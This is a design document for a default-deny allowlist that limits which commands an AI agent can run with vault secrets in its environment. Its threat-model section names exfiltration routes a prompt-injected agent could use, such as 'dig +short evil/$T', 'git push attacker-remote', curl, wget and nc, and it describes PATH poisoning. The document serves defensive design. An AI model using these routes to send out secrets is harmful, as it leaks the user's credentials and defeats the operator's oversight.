# Design: `alice exec` default-deny allowlist + v1.4.0 review followups

**Target**: v2.0.0
**Date**: 2026-05-29
**Status**: Approved, pending implementation plan.
**Supersedes (in part)**: `2026-05-28-alice-exec-design.md` (v1.4.0)

## Context

v1.4.0 shipped `alice exec` as "agent-invokable safe-mode" — agent can resolve placeholders into child env without ever surfacing plaintext on alice's stdout. A follow-up security review found the trust model was too loose:

1. **PATH-poisoning**: `exec.LookPath(cmd)` resolves via `$PATH`. An attacker (or prompt-injected agent) who can write to any user-writable PATH entry (e.g. `~/.local/bin/`) can substitute the binary and receive the resolved plaintext via env. Linux `/proc/<pid>/cmdline` is 0o644 by default, so the cmd name in shell history isn't even confidential.
2. **Agent-binary-choice**: even with absolute paths required, the agent picks *which* binary to invoke. The system has hundreds of network-capable binaries (`curl` / `wget` / `nc` / `ssh` / `dig +short evil/$T` / `python -c 'urllib...'` / `perl` / `openssl s_client` / `git push attacker-remote` ...). Operator review of "is this binary safe?" requires knowledge they don't have for every system tool.
3. **Operator-eyeballs-the-argv** (the TTY-prompt fallback): even if every invocation prompts a human, humans miss things in long URLs and complex flag sets. A prompt is not a sandbox.

The right design — landed after iteration — is **default-deny with operator-curated allowlist of exact (cmd, args, env_keys) triples**. Operator pre-blesses each known-good invocation; alice exec hard-denies anything else and prints a copy-paste-ready JSON entry the operator can append. After approval, the invocation runs **without TTY prompting**, restoring v1.4.0's agent-autonomous property for blessed patterns.

Alongside the allowlist, two small v1.4.0 review findings ship in the same release:

- **README Trust boundary** updates to disclose the same-uid env channel (`/proc/<pid>/environ`, `ps eww`) used by alice exec.
- **parseEnvFlag** rejects empty `--env KEY=` (intent must be explicit; `--env KEY=` writes nothing useful and is rejected with a clear error).

## Scope

Single v2.0.0 release. Breaking changes:
- `alice exec` refuses to run without an `~/.anb/alice/exec-allowlist.json` file. **Hard-deny on missing file.**
- For each invocation, alice exec requires a strict (byte-for-byte) match against an `allow[]` entry. **Hard-deny on no match.**
- `parseEnvFlag` rejects `--env KEY=` with empty VALUE.

No wire protocol changes. `bob` daemon, `internal/proto`, `internal/server`, `internal/client`, and authz.json are unchanged.

## Allowlist file

### Location and permissions

- Path: `~/.anb/alice/exec-allowlist.json` (override via `$ANB_ALICE_DIR`).
- Mode: `0o600` — consistent with `vault.json` and `authz.json` on the Bob side. Not a secret per se, but it IS authorization config; same-uid only.
- Owner of the file is the same uid that runs alice.

### Format

JSON with a single top-level `allow` array. Each entry is a triple:

```json
{
  "allow": [
    {
      "cmd":  "/opt/homebrew/bin/gh",
      "args": ["api", "user"],
      "env":  ["GH_TOKEN"]
    },
    {
      "cmd":  "/opt/homebrew/bin/git",
      "args": ["push", "origin", "feat/alice-exec"],
      "env":  ["GH_TOKEN"]
    }
  ]
}
```

Field types:
- `cmd` — string, MUST be absolute path (start with `/`). Validated at load time.
- `args` — array of strings. Each element is one positional argv slot AFTER cmd (so `argv[1:]` in execve terms). May be empty (`"args": []`) for nullary commands. Each string may contain any characters including empty string.
- `env` — array of POSIX env-name strings (matching `^[A-Za-z_][A-Za-z0-9_]*$`). May be empty (`"env": []`) for commands that need no vault-resolved env. Treated as a SET (order in the file is cosmetic).

Strict JSON parsing: `json.Decoder.DisallowUnknownFields = true`. Typos like `cmm:` or `arsg:` fail-loud at load with a clear error pointing at the entry.

### Matching algorithm (strict byte-for-byte equality)

For an invocation `(cmd, args, env_keys)`:

```go
func matchTriple(inv invocation, entry triple) bool {
    if inv.cmd != entry.Cmd { return false }
    if len(inv.args) != len(entry.Args) { return false }
    for i := range inv.args {
        if inv.args[i] != entry.Args[i] { return false }   // byte-for-byte
    }
    if len(inv.envKeys) != len(entry.Env) { return false }
    a := slices.Clone(inv.envKeys); slices.Sort(a)
    b := slices.Clone(entry.Env);   slices.Sort(b)
    return slices.Equal(a, b)
}
```

- `cmd`: byte-for-byte string equality. `"/opt/homebrew/bin/gh"` and `"/opt/homebrew/bin/gh "` (trailing space) do NOT match.
- `args`: slice length must match, AND each position must be byte-for-byte equal. `["api", "user"]` and `["api", " user"]` do NOT match. Different arg orderings (`["push", "origin", "foo"]` vs `["push", "foo", "origin"]`) do NOT match — operator pre-blesses one specific order.
- `env_keys`: treated as a SET. `["GH", "PATH"]` and `["PATH", "GH"]` DO match (order ignored). `["GH"]` and `["GH", "EXTRA"]` do NOT match (size differs).

Wildcards (`*`/`?`/regex/prefix) are NOT supported. Operator listing in the allowlist must EXACTLY match the planned invocation. Any change to cmd, args (including whitespace, position, count), or env-name SET requires a new entry.

This is deliberately strict. The cost (more entries as usage patterns vary) is accepted in exchange for: zero ambiguity in policy, zero parser complexity, no possibility of wildcard-too-greedy footguns (`https://api.github.com/*` matching `https://api.github.com/../evil/?`).

### Missing file behavior

If `~/.anb/alice/exec-allowlist.json` does not exist when `alice exec` is invoked: **hard-deny** with this error to stderr:

```
✗ alice exec: ~/.anb/alice/exec-allowlist.json not found.

alice exec is default-deny since v2.0.0. To enable any invocation, the
allowlist file must exist (even if empty).

Initialize with:
    echo '{"allow":[]}' > ~/.anb/alice/exec-allowlist.json

Then re-run your alice exec command; the error will give you the exact
triple to append.
```

Exit non-zero. Child not invoked.

If `alice enroll` is run as part of fresh setup (Alice's first contact with a Bob), it also scaffolds an empty `{"allow":[]}` to the state dir — mirrors `bob init`'s `authz.json.example` scaffold (v1.3.1).

For already-enrolled operators upgrading from v1.4.x, the one-line `echo` in the error message is the migration path.

### No-match behavior

If the file exists but no entry in `allow[]` matches the invocation: **hard-deny** with this error to stderr:

```
✗ alice exec: invocation not in allowlist.

  cmd:  /opt/homebrew/bin/gh
  args: ["api", "user"]
  env:  ["GH_TOKEN"]

To allow exactly this invocation, append to allow[] in
~/.anb/alice/exec-allowlist.json:

  {
    "cmd":  "/opt/homebrew/bin/gh",
    "args": ["api", "user"],
    "env":  ["GH_TOKEN"]
  }

Note: strict byte-for-byte equality on cmd, args (each position), and
env name set. Any change — extra whitespace, different arg position,
extra/missing env name — requires a new entry. Wildcards are not
supported.
```

Exit non-zero. Child not invoked.

The JSON snippet in the error is **valid JSON** — operator can `pbpaste` / open the file and paste it verbatim into the `allow[]` array (after adding a comma to the preceding entry if needed).

### Match behavior

If exactly one entry matches: alice resolves placeholders, prints the audit hint (`→ exec /path with env=[KEYS]`), and `syscall.Exec`s the child. Identical UX to v1.4.0's match path — **no TTY prompt**, agent-autonomous.

If multiple entries match (which can happen if operator added duplicates): the first match in file order wins. No error; the dup is operator-visible at file edit time.

### Validation at load time

When `alice exec` loads `exec-allowlist.json`, validate every entry. Fail-loud on the first invalid entry:
- `cmd` not absolute (doesn't start with `/`) → error referencing entry index
- `env` contains an invalid POSIX name → error referencing entry index + bad name
- JSON syntax error → standard json.Decoder error
- Unknown top-level key (e.g. `deny:` instead of `allow:`) → DisallowUnknownFields catches it
- Unknown field within a triple → DisallowUnknownFields catches it

Validation failures hard-deny ALL alice exec invocations until the file is fixed. There is no "partial load" behavior; either the whole file parses cleanly or alice exec refuses to run.

## TTY requirement: NOT required

v1.4.0 design had no TTY requirement. v2.0.0 keeps that: **no TTY required**. Once an invocation is allowlist-matched, alice resolves and execs without further confirmation.

The whole point of the allowlist is that the operator's confirmation happens ONCE at file-edit time, not per-invocation. Adding a TTY prompt on top would be redundant and break agent-autonomy.

If the file is missing or no match: hard-deny prints to stderr regardless of TTY-ness. No interactive escape.

## parseEnvFlag rejects empty VALUE

Current behavior (v1.4.0): `parseEnvFlag` accepts `--env KEY=` and produces `envEntry{Name: "KEY", Value: ""}`. The child sees `KEY=` (empty string env var). Not a security issue, but ambiguous intent.

New behavior: `parseEnvFlag` rejects `--env KEY=` with an error:

```
--env "KEY=": VALUE may not be empty (use unset env, or set to a literal placeholder like "<agent-vault:k>")
```

Trivial to implement: one extra `if val == ""` check in the existing parseEnvFlag function.

This adds one new test (`TestParseEnvFlagRejectsEmptyValue`) and slightly tightens parseEnvFlag's contract.

## README Trust boundary update

Append a new bullet to the "Trust boundary" section disclosing the env-channel:

```markdown
- **`alice exec` env values are same-uid visible.** Resolved plaintexts
  reach the child via env vars; same-uid processes can read them via
  `/proc/<pid>/environ` (Linux, 0o400 owner-only — i.e. same uid + root)
  or `ps eww` (macOS). This is strictly better than argv (Linux
  `/proc/<pid>/cmdline` is world-readable 0o644) but is NOT a
  memory-only channel. The allowlist limits *which* (cmd, args, env)
  triples can run, not what those processes do once running — the
  trust boundary is "alice + the operator-blessed binaries + same-uid
  process access".
```

Also update the Features bullet for "Agent-safe exec" to mention allowlist:

```markdown
- **Agent-safe exec (operator-allowlisted)** — `alice exec --env KEY=<agent-vault:k> -- <cmd> <args>`
  is default-deny since v2.0.0. Operator pre-blesses exact
  (cmd, args, env_keys) triples in `~/.anb/alice/exec-allowlist.json`.
  Matched invocations resolve placeholders into the child's env and
  `syscall.Exec` the child without further prompting (agent-autonomous);
  any change to the triple — including whitespace, arg order, or env
  names — requires a new entry. Companion: `alice write --quiet`
  routes status lines to stderr.
```

Update the alice safe command-table to reflect the new behavior:

```markdown
| `alice exec [--env KEY=V]... -- <cmd> [args...]` | Match against `exec-allowlist.json`; on hit, resolve placeholders and `syscall.Exec` the child. Default-deny — see Authorization section for allowlist format. |
```

Daily-use example updated to show the allowlist setup flow:

```sh
# v2.0.0+: alice exec is default-deny. First-time setup:
echo '{"allow":[]}' > ~/.anb/alice/exec-allowlist.json

# Then try the call you want to run; the error message tells you the
# exact triple to append. Example after operator pastes the suggested
# entry into allow[]:
alice exec --env 'GH_TOKEN=<agent-vault:gh-pat>' \
  -- /opt/homebrew/bin/gh api user
```

## Files touched

| File | Change | ~LOC |
|---|---|---|
| `cmd/alice/exec.go` | (1) `parseEnvFlag` rejects empty VALUE. (2) `cmdExec` after `parseEnvFlag` loads + validates allowlist via new `loadAllowlist(dir)`, then calls new `matchAllowlist(inv, entries) bool`. (3) Deny paths print the documented error templates including the copy-paste JSON for no-match. | +90 |
| `cmd/alice/exec_test.go` | New unit tests: `TestParseEnvFlagRejectsEmptyValue`, `TestLoadAllowlistAcceptsValid` / `RejectsBadJSON` / `RejectsNonAbsCmd` / `RejectsBadEnvName` / `RejectsUnknownField`, `TestMatchAllowlistExactEquality` / `OrderingOfArgsMatters` / `EnvKeysSetEquality` / `NoWildcards`. | +180 |
| `cmd/alice/sensitive.go` | `cmdEnroll` after writing config.json, writes `exec-allowlist.json` with content `{"allow":[]}` (0o600). Idempotent: if the file already exists, leave it alone (don't clobber existing operator config). | +8 |
| `e2e/full_test.go` | New e2e: `TestAliceExecHappyPathWithAllowlist` (set up allowlist with matching entry, invocation succeeds), `TestAliceExecDeniedWhenAllowlistMissing` (no file → fail-closed), `TestAliceExecDeniedWhenNoMatch` (file exists but no entry matches → fail-closed, child not invoked, error message contains copy-paste JSON). Existing `TestAliceExecHappyPath` and `TestAliceExecFailClosedOnMissingKey` need to be updated to also seed an allowlist. | +120 modify + ~60 new |
| `README.md` | Trust boundary new bullet (env-channel), Features bullet rewrite (allowlist), command-table row update, Daily-use example shows the setup flow, install snippet v1.4.0 → v2.0.0. | ~40 |

**Total**: ~500 LOC source + tests + docs.

## Out of scope (deferred to v2.1+)

- **Wildcards / regex / prefix matching in args**. Strict equality is the v2.0 baseline. Future versions can add an opt-in `pattern` field per arg position (e.g. `{"args": [{"literal": "api"}, {"match": "users/*"}]}`).
- **Args-prefix `**` trailing wildcard**. Same reason.
- **Per-triple metadata** (description, owner, expiry timestamp). Worth adding when allowlists grow large; v2.1+.
- **`alice exec --policy <name>`** — named policies referenced from CI/automation. v2.1+.
- **Audit hook** — appending denied invocations to a separate audit log. Operator can `tail -f` `bob.log` and grep for `DENY` lines already covers the existing server-side audit; alice-side denial audit is informational.
- **Allowlist file watch / reload on change**. Not needed — alice exec is a one-shot per invocation; it reads the file each call.
- **TUI / interactive `alice allowlist add` command**. Operator edits JSON directly. The error message provides copy-paste-ready JSON, which is the fast path.

## Versioning

**v2.0.0** — major bump:
- Breaking: `alice exec` requires `exec-allowlist.json` (previously didn't exist as a concept). All v1.4.0 alice exec callers break until they create the file and add their triples.
- Breaking: `parseEnvFlag` rejects empty VALUE (previously accepted).
- Non-breaking, but reclassifies: alice exec stays in the safe (agent + human, no TTY) command table — allowlist-matched invocations still don't need a TTY.

Release notes must explicitly call out:
- The behavior shift from default-allow to default-deny.
- The one-line `echo` migration command.
- That the per-invocation TTY prompt design (intermediate proposal) was rejected in favor of allowlist + agent-autonomy.

## Verification

End-to-end after merge:

1. `go test ./...` green.
2. `alice exec --env 'X=<agent-vault:k>' -- /bin/echo hi` on a system without `~/.anb/alice/exec-allowlist.json` → fail-closed with the "file not found" error. Child does NOT run.
3. `echo '{"allow":[]}' > ~/.anb/alice/exec-allowlist.json` then re-run → fail-closed with the "not in allowlist" error including the exact JSON triple. Child does NOT run.
4. Append the suggested triple to `allow[]`, re-run → success. Audit hint to stderr, plaintext to child env, `hi` to child stdout.
5. Change any byte of the invocation (whitespace, env name, arg position) → fail-closed again with a new copy-paste suggestion. The previously approved triple does NOT shadow-allow a similar invocation.
6. `--env KEY=` (empty value) → parseEnvFlag rejects pre-allowlist.
7. `alice enroll --identity test --bob localhost:8443 --server-name localhost --ca ./ca.crt` against a fresh state dir → `exec-allowlist.json` exists at `0o600` with content `{"allow":[]}`.
8. `alice enroll` against an existing state dir with a non-empty `exec-allowlist.json` → existing file is NOT clobbered (re-enroll preserves operator's allowlist).
